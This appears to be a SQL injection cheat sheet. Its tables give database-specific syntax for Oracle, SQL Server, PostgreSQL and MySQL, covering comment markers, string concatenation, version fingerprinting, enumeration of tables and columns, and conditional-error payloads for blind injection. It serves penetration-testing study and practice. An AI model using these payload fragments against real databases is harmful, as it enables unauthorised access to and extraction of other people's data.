#### comments

| syntax | type |
|:---:|:---:|
|```--comment```|*oracle, microsoft, postgresql*|
|```-- comment```|*mysql*|
|```/*comment*/```|*microsoft, postgresql, mysql*|

-----


#### string concatenation

| syntax | type |
|:---:|:---:|
|```'foo'\|\|'bar'```|*oracle, postgresql*|
|```'foo'+'bar'```|*microsoft*|
|```'foo' 'bar'```|*mysql*|
|```CONCAT('foo','bar')```|*mysql*|

-----


#### version

| syntax | type |
|:---:|:---:|
|```SELECT version FROM v$instance```|*oracle*|
|```SELECT banner from v$instance```|*oracle*|
|```SELECT @@version```|*microsoft, mysql*|
|```SELECT version()```|*postgresql*|

-----


#### database contents

| syntax | type |
|:---:|:---:|
|```SELECT * FROM all_tables```|*oracle*|
|```SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'```|*oracle*|
|```SELECT * FROM information_schema.tables```|*microsoft, postgresql, mysql*|
|```SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'```|*microsoft, postgresql, mysql*|

-----


#### conditional errors

| syntax | type |
|:---:|:---:|
|```SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual```|*oracle*|
|```SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END```|*microsoft*|
|```SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END```|*postgresql*|
|```SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')```|*mysql*|

-----